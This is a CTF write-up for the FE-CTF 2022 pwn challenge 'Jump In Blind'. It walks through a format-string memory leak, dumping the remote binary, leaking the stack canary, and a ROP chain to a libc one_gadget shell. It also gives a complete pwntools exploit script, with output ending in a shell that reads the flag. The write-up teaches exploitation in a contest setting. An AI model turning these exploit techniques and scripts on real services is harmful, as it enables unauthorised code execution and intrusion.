# FE-CTF 2022: Cyber Demon

# Challenge: Jump In Blind
**Tags:** `pwn`, `blind`, `remote`

## Table of Contents
- [What Is This?](#What-Is-This) 
- [Un-blinding](#Un-blinding) 
- [(Actual) Un-blinding](#Actual-Un-blinding) 
- [The Binary](#The-Binary) 
- [Leaking the Canary](#Leaking-the-Canary) 
- [Rop and one_gadget](#Rop-and-one_gadget)
- [Automating Vulnerability Check](#Automating-Vulnerability-Check)
- [Running doit.py](#Running-doitpy)
- [Initial Approach](#Initial-Approach)

## What Is This?

The player is only given:
```
$ nc jump-in-blind.hack.fe-ctf.dk 1337
```

Here we find a service that prints out some nice art constituting of a stick figure falling into a portal thingy (jumping in blind?). The service provides an echo-like functionality where the given input is thrown right back at the client, and then asks again/loops.

```
== proof-of-work: disabled ==
        		
                      |
                        |
                   | |
       ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|⠀⠀o⠀/⠀|⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀/\⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀/\⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⢀⣤⣴⣾⣿⣿⡿⠿⠿⠿⠟⠛⠛⠻⠿⠿⠿⢿⣿⣿⣷⣦⣤⡀⠀⠀⠀
      ⢀⣼⣿⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⣿⣧⡀⠀
      ⢸⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡇⠀
      ⠈⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⠁⠀
      ⠀⠀⠈⠛⠳⢦⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⡴⠞⠛⠁⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
>> aaaa
aaaa

>> vasdasdasdad
vasdasdasdad

>>
```

As this is a pwn challenge, we start by yelling at the service with some number of A's:
```
[art]
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAKap)
[connection closed]
```
In this case it prints out more than the A's we gave as input (`Kap)`) and the connection closes, this suggests a buffer overflow. However, running in another instance with the same number of A's gives another result:

```
[art]
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA
>> AAAAAAAAAAAAAAAAAAAAAAA
>> AAAAAAAAAAAAAAAAAAAAAAA
>> AAAAAAAAAAAAAAAAAAAA

>>
```
This suggests that it is not the same program running everytime - and that the vulnerablity does not seem to be persistent in the service.

## Un-blinding

Just with this information we are quite blind, but surely there must be a way to un-blind ourselves. Perhaps the service is a simple C program that uses `printf` in an insecure way. Let's test that by giving some format specifiers.

```
[art]
>> %p %p %p %p
0x7fff75459750 0x3b 0x7fe43461de8e (nil)
```
Here we print the first 4 arguments to `printf` (aside from the format argument) in hexadecimal (which are given by the registers `rsi`, `rdx`, `rcx` and `r8`, assuming an x86_64 linux machine). We are pretty certain it is a 64bit machine as `%p` prints the value as a pointer address and is larger `0x7fff75459750` than any 32bit number.

Let's try to print the buffer itself:
```
>> A B %s
A B A B %s


>>
```
Here the first `"A B"` are from the input, and the `"%s"` is then converted to a `"A B %s\n"` (the input string). This suggests the code is something like this.
```
buf <- read_data()
printf(&buf)
```

On such a x86_64 linux machine, the arguments are given in the registers: `rdi, rsi, rdx, rcx, r8, r9` and then spills the rest onto the stack. The first argument is the format specifier which is given in `rdi`, hence there `5` registers we can reference, before we reach the stack, which will correspond to argument `6` and onwards, which can retrieved by using the symbol `$` to index the list of arguments `%<num>$p`. A bit of toying with this idea we can make `printf` print our input:
```
>> AA%7$pBBCCCCCCCC
AA0x4343434343434343BBCCCCCCCC
```
between `AA` and `B` we have `0x4343434343434343` which is the hexadecimal representation of `CCCCCCCC`. Some reasoning for using `%7$p`, is due to that the using `%6$p` will leak the first qword on the stack, which presumably is the buffer, hence the string `"AA%7$pBB"`, but we can then get the next qword `"CCCCCCCC"` by using `7`.

Now using this approach with `"%s"`, we can then print/leak the string at address `0x4343434343434343` (this would most likely segfault). We can make a function primitive to leak data at address `addr` using `Pwntools`:

```python
r = remote(HOST, PORT)
@MemLeak
def leaker(addr):
  r.recvuntil(b">> ")
  r.send(b'AA' + f'%7$s'.encode() + b'BB' + p64(addr))
  leak = r.recvline()
  get = leak.split(b'AA')[1].split(b'BB')[0] + b'\x00'
  return get
```
This is not the prettiest code, but it works - one could perhaps use `p64(addr) + '\x00' + %6$s` using the reasoning I gave above. Notice that we add a nullbyte in the end of the leak before returning, as the convention/definition of a string, states that it ends in a nullbyte - and we are printing strings with `"%s"`.
  * The `@MemLeak` decorator is from `Pwntools` and simply adds some nice features (e.g. caching already leaked addresses).
  * We do not check if `addr` contains newlines, which might be a concern if some newline sensitive function is used to read input, such as `fgets/gets`. These functions stop when reaching a newline character, meaning that it would not be possible to leak memory from addresses containing a `0x0a` byte. However, by toying with the service as we did before, one will find that is does not seem that the service will treat newline characters differently from other bytes.

We can use this primitive to leak the binary and then check what we are actually dealing with (and get some further insights into the vulnerability/overflow that seemed to be present before):
```python
# Leaks `n` bytes starting from the address `start` until some error occurs.
def leak_binary(start, n):
  binary = b""
  off = 0
  while off < n:
    try:
      leaked  = leaker(start+off)
      off    += len(leaked)
      binary += leaked
    except:
      return binary
  return binary
```

## (Actual) Un-blinding

Before we can leak the binary, we need to find it in virtual memory - and we need to be careful because we might segfault. Usually (my experience) for 64bit binaries on linux, they will be loaded into `0x400000`, but this might be position independent executable (PIE) and thus be prone to ASLR. Attempting to leak `0x400000`, we find that the connection dies. We can however print the stack, so lets check if we can find something useful there (the choice of `30` for the loop is quite arbitrary):
```python
for i in range(7,30):
  r.sendafter(b">> ", f'%{i}$p'.encode())
  leak = r.recvline().decode().strip()
  log.info(str(i) + ': ' + leak)
```
Giving output 
```
[*] 7: (nil)
[*] 8: (nil)
[*] 9: (nil)
[*] 10: (nil)
[*] 11: (nil)
[*] 12: (nil)
[*] 13: (nil)
[*] 14: 0x55de34ca0000
[*] 15: 0x865bc19c13c24500
[*] 16: 0x7ffced0bcbc0
[*] 17: 0x55de34cad7f8
[*] 18: 0x7ffced0bccb0
[*] 19: 0x865bc19c13c24500
[*] 20: 0x55de34cad870
[*] 21: 0x7ffa82c35d0ai
[*] 22: 0x7ffced0bccb8
[*] 23: 0x100000000
[*] 24: 0x55de34cad7bd
[*] 25: 0x7ffa82c357cf
[*] 26: (nil)
[*] 27: 0x84290c4abe96b433
[*] 28: 0x55de34cad120
[*] 29: (nil)
```
The kernel on common linux distirbutions usually loads (in my experience) PIE binaries into addresses starting with `0x55...` or `0x56...`.

Assuming this is a ELF binary and that we can get such a leak, we can further check/leak backwards in virtual memory at the start of each page, until we reach the ELF header, as the binary will be loaded into virtual memory in a page-aligned fashion. I initially made some code for this myself, but `DynELF` from `pwntools` also works great (and I also think it uses the same idea):
```python
bptr = None
for i in range(7,30):
  r.sendafter(b">> ", f'%{i}$p'.encode())
  leak = r.recvline().decode().strip()
  if not bptr and ('0x55' == leak[:4] or '0x56' == leak[:4]):
    bptr = int(leak, 16)
    break

base = DynELF.find_base(leaker, bptr)
```

## The Binary

Having the base address we can use the `leak_binary` function shown before:
```python
binary = leak_binary(base, 0x4000)
```
Here I chose to leak `0x4000` bytes as an starting value, but the connection dies at around `0x3700`. I did not check if the connection timed out or some other error occured. These bytes were enough to carry out the exploit.


Saving `binary` into a file `binfile.elf`, we can then:
```
binfile2.elf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /home/user/assets/glibc/ld-2.31.so, missing section headers at 21480
```
Which confirmes some of our assumptions of the program. Now
loading it into `Ghidra` or simply by using `disasm(binary)` from pwntools, and then inspecting the output, one can find the following code
(You may have to tell `Ghidra` which parts of the binary that needs to be interpreted as code). Notice this is

```
147b:       f3 0f 1e fa             endbr64
147f:       55                      push   rbp
1480:       48 89 e5                mov    rbp, rsp
1483:       48 83 ec 30             sub    rsp, 0x30
1487:       64 48 8b 04 25 28 00    mov    rax, QWORD PTR fs:0x28
148e:       00 00
1490:       48 89 45 f8             mov    QWORD PTR [rbp-0x8], rax
1494:       31 c0                   xor    eax, eax
1496:       48 c7 45 d0 00 00 00    mov    QWORD PTR [rbp-0x30], 0x0
149d:       00
149e:       48 c7 45 d8 00 00 00    mov    QWORD PTR [rbp-0x28], 0x0
14a5:       00
14a6:       48 c7 45 e0 00 00 00    mov    QWORD PTR [rbp-0x20], 0x0
14ad:       00
14ae:       48 c7 45 e8 00 00 00    mov    QWORD PTR [rbp-0x18], 0x0
14b5:       00
14b6:       c7 45 f0 00 00 00 00    mov    DWORD PTR [rbp-0x10], 0x0
14bd:       66 c7 45 f4 00 00       mov    WORD PTR [rbp-0xc], 0x0
14c3:       48 8d 45 d0             lea    rax, [rbp-0x30]
14c7:       ba 65 00 00 00          mov    edx, 0x65
14cc:       48 89 c6                mov    rsi, rax
14cf:       bf 00 00 00 00          mov    edi, 0x0
14d4:       e8 27 fc ff ff          call   0x1100
14d9:       48 8d 45 d0             lea    rax, [rbp-0x30]
14dd:       48 89 c7                mov    rdi, rax
14e0:       b8 00 00 00 00          mov    eax, 0x0
14e5:       e8 06 fc ff ff          call   0x10f0
14ea:       b8 00 00 00 00          mov    eax, 0x0
14ef:       48 8b 4d f8             mov    rcx, QWORD PTR [rbp-0x8]
14f3:       64 48 33 0c 25 28 00    xor    rcx, QWORD PTR fs:0x28
14fa:       00 00
14fc:       74 05                   je     0x1503
14fe:       e8 dd fb ff ff          call   0x10e0
1503:       c9                      leave
1504:       c3                      ret
```
With the decompilation from `Ghidra`:
```C
undefined8 do_stuff(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  undefined8 buf;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;  
  undefined2 local_14;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  buf = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_14 = 0;
  read(0,&buf,0x65);
  printf(&buf);
  uVar1 = 0;
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
    uVar1 = stack_check();
  }
  return uVar1;
}
```
Here we make the following observations:
  * Considering the functionality of the service, it looks like this function is called multiple times in a loop.
  * Space made on the stack is `0x30` bytes.
  * `8` of these bytes are for the canary.
  * There is also a `saved rbp` which is saved after the `0x30` bytes.
  * The read function reads `0x65` bytes.

By these observations we can see that we have a buffer overflow and can for example exploit it by overwriting the return address. However, we also need to leak the canary and find a place to jump to.

## Leaking the Canary

We already demonstrated that we can leak the stack, meaning we can obtain the canary - but we still need to distinguish the canary from other values. We know that the canary will be 8 bytes where the least significant byte is a 0x00. The reason why canaries have this byte equal to `0x00` is to mitigate the improper use of string functions, which will stop when reaching the null byte.

Looking at the output of the stack from before in [(Actual) Un-blinding](#actual-un-blinding), the only candidate is `0x865bc19c13c24500`.
  * Another way to make this guess is to remember that in a stack frame, the canary is put before the `saved rbp`, which is before the return address.
  * Since this function is most likely called in a loop from a function in the binary, the return address will have an address inside the binary (addresses starting with `0x55...` or `0x56...`), the `saved rbp` is on the stack hence will usually (my experience) start with `0x7ff...`. This pattern can be seen in the stack output from before.


Printing the stack for different connections shows that the offset for the canary changes, hence we will make some code to find it dynamically. Simply extend the code given at the end of [(Actual) Un-blinding](#actual-un-blinding) to the following - where first and the last two lines are new:
```python
bptr, canary = None, None
for i in range(7,30):
  r.sendafter(b">> ", f'%{i}$p'.encode())
  leak = r.recvline().decode().strip()
  if not bptr and ('0x55' == leak[:4] or '0x56' == leak[:4]):
    bptr = int(leak, 16)
  if not canary and len(leak) >= 8*2+1 and leak[-2:] == '00':
    canary = int(leak, 16)
```

## Rop and one_gadget

As we can essentially leak memory from every address, we can also utilise `DynELF` to leak `libc`. It does this by using the `link map` structure. If you want to understand this is depth, one could start by reading the documentation of `DynELF` and perhaps solve the `ELF` challenge on `pwnable.kr` without using `DynELF`.

Once `libc.base` is found, one could leak all of `libc` and then look for gadgets, but I will instead just figure out the specific version and then download it from a public resource:
```
$ strings binfile.elf | grep libc
/home/user/assets/glibc/ld-2.31.so
```
Where `binfile.elf` is the leaked binary and we see that the version of the linker is `2.31` and it's then possible to download the corresponding version of libc:
https://ubuntu.pkgs.org/20.04/ubuntu-main-amd64/libc-bin_2.31-0ubuntu9_amd64.deb.html.

One could perhaps also find this information by using a `libc` database: https://libc.blukat.me/. 


We will now find and utilise a `one_gadget`:
```
$ one_gadget libc6_2.31-9_amd64.so
0xcbd1a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

I can spoil that the conditions will not hold, hence we need to rop the binary a bit. We will simply choose the first one at offset `0xcbd1a`. Using the `ropper` tool (https://github.com/sashs/Ropper), we can find a `r12 = r13 = null` gadget:
```
$ ropper -f libc6_2.31-9_amd64.so --search "pop %r12; pop %r13; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop %r12; pop %r13; ret;

[INFO] File: libc6_2.31-9_amd64.so
0x0000000000028487: pop r12; pop r13; ret;
[...]
```
* This gadget with nullbytes on the stack will achieve `r12 = r13 = null`.

From this we can write the following payload:
```python
# 0x0000000000028487: pop r12; pop r13; ret;
gadget_offset = 0x0000000000028487
# one_gadget
win_offset    = 0xcbd1a

# Find libc base
d         = DynELF(leaker, base)
libc      = d.lookup(None, 'libc.so')

# Build payload
ret  = b''
ret += b'A'*(size-8)             # buffer size - 8
ret += p64(canary)               # pass canary check
ret += b'A'*8                    # trash - saved rbp
ret += p64(libc + gadget_offset) # pop r12; pop r13
ret += p64(0)*2                  # r12=0, r13=0
ret += p64(libc + win_offset)    # win
```

## Automating Vulnerability Check

The buffer size might be insuffient for overflow, and we also need a variable size of A's (the `size` variable in the code above). This is something we can automate. 

Checking the leaked binary file, the vulnerable function  is often found in the range `0x1200-0x1500` from the binary base, hence we first leak this range of memory and then find the function by pattern:
```python
# leak the binary
base  = DynELF.find_base(leaker, bptr)
stuff = leaker.n(base+0x1250, 0x300)

# find function based on the bytes shown below:
#   15:   48 89 45 f8             mov    QWORD PTR [rbp-0x8], rax
#   19:   31 c0                   xor    eax, eax
#   1b:   48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40], 0x0
func_addr = base+0x1250+stuff.index(b'\x48\x89\x45\xf8\x31\xc0\x48\xc7\x45')-0x15
```
Notice that we subtract 0x15 due to the pattern starting at byte 0x15 of the vulnerable function. Once we have found the location of the function we 'leak again' (most is already cached because of the @MemLeak decorator) since we want to obtain the stackframe/buffer size:
```
0:       f3 0f 1e fa             endbr64
4:       55                      push   rbp
5:       48 89 e5                mov    rbp, rsp
8:       48 83 ec 30             sub    rsp, 0x30 <--- This value
```
which is done in the code below:
```python
# Leak vulnerable function
code = leaker.n(func_addr, 200)

# Extract buffer size
size = leaker.n(func_addr+0x8, 4)[-1]
```
We now what to find the number of bytes read by the `read` call. The code looks like this:
```
48 8d 45 d0             lea    rax, [rbp-0x30]
ba 65 00 00 00          mov    edx, 0x65 <--- We want this
48 89 c6                mov    rsi, rax
bf 00 00 00 00          mov    edi, 0x0
e8 27 fc ff ff          call   0x1100
```
We search for the `0xba` and then take the next byte. We then check if the overflow is sufficient given the payload we made before:
```python
# Extract number of bytes read
# ba 65 00 00 00          mov    edx, 0x65 (read_n=0x65)
read_n = code[code.index(b'\xba')+1]

# Check if overflow sufficient
if read_n < size-8 + 8 + 8 + 2*8+ 8:
  # buf + canary + rbp + gadget + 2*p64(0) + one_gadget
  log.failure('Overflow is not sufficient')
  return 1
```

## Running doit.py
The final exploit script has some more checks of validity. Some examples are that `DynELF` might be given something bad or the canary might not be found. Hence I simply made it run in a loop until it works. The final exploit script is given below
```python
#!/usr/bin/env python3
from pwn import *

context.arch      = 'amd64' # [ amd64 | i386 ]
context.os        = 'linux'
context.endian    = 'little'

HOST, PORT = "jump-in-blind.hack.fe-ctf.dk", 1337

@MemLeak
def leaker(addr):
  r.recvuntil(b">> ")
  r.send(b'AA' + f'%7$s'.encode() + b'BB'  + p64(addr))
  leak = r.recvline()
  get = leak.split(b'AA')[1].split(b'BB')[0] + b'\x00'
  return get

def leak_binary(start, n):
  binary = b""
  off = 0
  while off < n:
    try:
      leaked  = leaker(start+off)
      off    += len(leaked)
      binary += leaked
    except:
      return binary
  return binary

def main():

  # Leak binary pointer and canary
  bptr, canary = None, None
  stack = []
  for i in range(7,30):
    r.sendafter(b">> ", f'%{i}$p'.encode())
    leak = r.recvline().decode().strip()
    if not bptr and ('0x55' == leak[:4] or '0x56' == leak[:4]):
      bptr = int(leak, 16)
    if not canary and len(leak) >= 8*2+1 and leak[-2:] == '00':
      canary = int(leak, 16)
    stack.append(leak)
  if not bptr:
    log.failure('Pointer for binary not found')
    print(stack)
    return 1
  if not canary:
    log.failure('Canary not found')
    print(stack)
    return 1

  log.info('Possible binary ptr: ' + hex(bptr))
  log.info('Canary: ' + hex(canary))

  try:
    base = DynELF.find_base(leaker, bptr)
  except:
    log.failure('DynELF leaking base failed')
    return 1

  # 0x0000000000028487: pop r12; pop r13; ret;
  gadget_offset = 0x0000000000028487
  #one_gadget
  win_offset = 0xcbd1a

  stuff=leaker.n(base+0x1250, 0x300)

  try:
    #   15:   48 89 45 f8             mov    QWORD PTR [rbp-0x8], rax
    #   19:   31 c0                   xor    eax, eax
    #   1b:   48 c7 45 c0 00 00 00    mov    QWORD PTR [rbp-0x40], 0x0
    func_addr = base+0x1250+stuff.index(b'\x48\x89\x45\xf8\x31\xc0\x48\xc7\x45')-0x15
  except:
    log.failure('Could not find pattern for vuln function')
    # print(disasm(leaker.n(base+0x1250, 0x200)))
    return 1

  # Leak vulnerable function
  code = leaker.n(func_addr, 200)

  # Extract buffer size
  size = leaker.n(func_addr+0x8, 4)[-1]

  # Extract number of bytes read
  # 7b:   ba 33 00 00 00          mov    edx, 0x33
  read_n = code[code.index(b'\xba')+1]

  # Check if overflow sufficient
  if read_n < size-8 + 8 + 8 + 2*8+ 8:
    # buf + canary + rbp + gadget + 2*p64(0) + one_gadget
    log.failure('Overflow is not sufficient')
    return 1

  # Find libc base
  d    = DynELF(leaker, base)
  libc = d.lookup(None, 'libc.so')

  # Build exploit
  ret  = b''
  ret += b'A'*(size-8)
  ret += p64(canary)
  ret += b'A'*8
  ret += p64(libc + gadget_offset) 
  ret += p64(0)*2
  ret += p64(libc + win_offset)

  r.sendafter(b'>> ', ret)
  r.interactive()
  return 0

if __name__ == "__main__":
  r = remote(HOST, PORT)
  while main():
    r.close()
    log.info('Trying again')
    print()
    r = remote(HOST, PORT)
```

Below we needed 3 tries, where the two first had insufficient buffer sizes, but notice that other problems can occur as mentioned (canary/base leak and pattern finding - see code):

```
$ python doit.py
[+] Opening connection to jump-in-blind.hack.fe-ctf.dk on port 1337: Done
[*] Possible binary ptr: 0x55d21b1c4120
[*] Canary: 0x3532fe86655fad00
[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
[+] Finding base address: 0x55d21b1c3000
[-] Overflow is not sufficient
[*] Closed connection to jump-in-blind.hack.fe-ctf.dk port 1337
[*] Trying again

[+] Opening connection to jump-in-blind.hack.fe-ctf.dk on port 1337: Done
[*] Possible binary ptr: 0x556cefbef629
[*] Canary: 0x82b594e46e276200
[+] Finding base address: 0x556cefbee000
[-] Overflow is not sufficient
[*] Closed connection to jump-in-blind.hack.fe-ctf.dk port 1337
[*] Trying again

[+] Opening connection to jump-in-blind.hack.fe-ctf.dk on port 1337: Done
[*] Possible binary ptr: 0x55f45038b120
[*] Canary: 0x7557f9c76fcede00
[+] Finding base address: 0x55f45038a000
[+] Resolving 'libc.so': 0x7fc305e35180
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
assets
chal_base.c
generator.py
$ cat /flag
flag{1_h0p3_y0u_d1dn7_r0p_7h3_B1n4ry!}
$
```

Whoops.. Well, we did rop the binary. My first approach which did not rely on rop did however not work.

We are also given `chal_base.c` and `generator.py` which essentially constitutes the source for the challenge. Here we indeed see that the function I listed before in `Ghidra` is called in a loop and that parts of the binary is different/dynamically generated (which is the reason why the overflow sometimes is not present). I will let you explore these files yourselves. 


## Initial Approach

This was not my initial strategy with this challenge, which unforutnately did not work. My initial attempt was to overwrite `printf.GOT` with `libc.system`, but that did not work - the binary probably had `full RELRO`. Since `glibc 2.31` is used, `__malloc_hook` is present, and I then managed to overwrite that with `libc.one_gadget` and then by giving the service the input `"%<something_huge>c"`, would hopefully make `printf` call `malloc` as there is not enough space on the stack, which would call `__malloc_hook`, which is a call to `libc.one_gadget`. It did however not work most likely because the conditions of the `one_gadget` were not met. 

I noticed that there is one way to get around the extra gadget to set `r12=r13=null` by using another one-gadget:
```
0xcbd20 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
We only need to change the overflow to consist of null bytes instead of A's: 
```python
ret  = b''
ret += b'\x00'*(size-8)
ret += p64(canary)
ret += b'A'*8
ret += p64(libc + 0xcbd20)
```
  * I am not exactly sure why this works. My intuition was that `rsi`, `rdx` maybe pointed to something on the stack and hence if I filled the buffer on the stack with nullbytes, then it would perhaps work. 
  * It is also important that the first byte is a nullbyte (I tested it), so this technique can not be used in the `__malloc_hook` approach I gave as `printf("\x00%<something_huge>c")` will just stop at the `\x00` and we need it to make the huge allocation.